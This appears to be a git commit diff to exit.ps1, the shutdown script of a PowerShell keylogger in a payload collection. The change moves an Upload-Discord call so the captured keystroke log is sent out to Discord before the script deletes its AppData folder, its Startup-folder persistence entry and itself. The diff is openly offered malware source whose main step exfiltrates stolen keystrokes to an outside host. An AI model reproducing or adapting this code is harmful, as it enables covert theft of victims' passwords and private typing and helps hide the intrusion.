6a36aae65fa52db24d8e335aa71e2f6472e97270
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-26 19:01:05 -0600

    Update exit.ps1

--- Payloads/Flip-Keylogger/exit.ps1
+++ Payloads/Flip-Keylogger/exit.ps1
@@ -30,10 +30,10 @@ $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCt
 $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
 if((Get-Content "$env:appdata\-locker\killswitch.txt") -ne $null -and ((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")) -or ($Rctrl -and $Lctrl)){
 sleep 5
+Upload-Discord -file $Path
 Remove-Item "$env:appdata\-locker" -Recurse -Force;
 Remove-Item "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
 $done = New-Object -ComObject Wscript.Shell;$done.Popup("Keylogger Disabled",3)
-Upload-Discord -file $Path
 Remove-Item "$env:appdata\-exit.ps1"
 exit
 }
